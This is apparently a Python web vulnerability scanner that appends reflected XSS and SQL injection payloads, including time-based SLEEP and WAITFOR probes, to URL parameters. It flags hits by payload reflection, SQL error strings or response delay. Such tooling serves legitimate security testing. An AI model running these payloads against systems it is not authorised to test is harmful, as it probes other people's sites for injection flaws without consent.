import requests
import time


# --------------------------------
# Session + Headers (speed boost)
# --------------------------------
session = requests.Session()

HEADERS = {
    "User-Agent": "DSG-Scanner/1.0"
}


# -------------------------
# XSS Payloads
# -------------------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]


# -------------------------
# SQL Payloads
# -------------------------
SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--"
]


# -------------------------
# SQL Error Signatures
# -------------------------
SQL_ERRORS = [
    "SQL syntax",
    "mysql_fetch",
    "ORA-01756",
    "syntax error",
    "Unclosed quotation mark",
    "SQLite error",
    "Warning: mysql",
    "PostgreSQL"
]


# -------------------------
# Time-based SQL payloads
# -------------------------
TIME_SQL_PAYLOADS = [
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR pg_sleep(5)--"
]


# --------------------------------
# Helper: Build payload URL safely
# --------------------------------
def build_url(url, param, payload):

    if "?" in url:
        return f"{url}&{param}={payload}"
    else:
        return f"{url}?{param}={payload}"


# -------------------------
# Time-based SQL Injection
# -------------------------
def test_time_sql(url, params):

    vulns = []

    for param in params:

        for payload in TIME_SQL_PAYLOADS:

            test_url = build_url(url, param, payload)

            try:

                start = time.time()

                session.get(test_url, headers=HEADERS, timeout=10)

                elapsed = time.time() - start

                if elapsed > 5:

                    vulns.append({
                        "type": "Time-based SQL Injection",
                        "parameter": param,
                        "payload": payload,
                        "url": test_url
                    })

            except:
                pass

    return vulns


# -------------------------
# XSS Testing
# -------------------------
def test_xss(url, parameters):

    vulnerabilities = []

    for param in parameters:

        for payload in XSS_PAYLOADS:

            try:

                test_url = build_url(url, param, payload)

                response = session.get(test_url, headers=HEADERS, timeout=5)

                if payload in response.text:

                    vulnerabilities.append({
                        "type": "Reflected XSS",
                        "parameter": param,
                        "payload": payload,
                        "url": test_url
                    })

            except:
                pass

    return vulnerabilities


# -------------------------
# SQL Injection Testing
# -------------------------
def test_sql(url, parameters):

    vulnerabilities = []

    for param in parameters:

        for payload in SQL_PAYLOADS:

            try:

                test_url = build_url(url, param, payload)

                response = session.get(test_url, headers=HEADERS, timeout=5)

                for error in SQL_ERRORS:

                    if error.lower() in response.text.lower():

                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "parameter": param,
                            "payload": payload,
                            "url": test_url,
                            "evidence": error
                        })

                        break

            except:
                pass

    return vulnerabilities